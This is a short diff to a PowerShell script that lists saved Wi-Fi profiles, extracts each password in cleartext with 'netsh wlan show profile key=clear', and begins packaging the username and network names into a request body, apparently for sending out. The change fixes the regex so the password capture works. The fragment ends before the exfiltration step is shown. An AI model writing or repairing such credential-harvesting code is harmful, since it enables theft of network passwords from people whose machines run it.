@@ -1,6 +1,6 @@
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
-    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=).+'
+    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key content\s:\s).+'
 
 	$Body = @{
 		'username' = $env:username + " | " + [string]$wlan
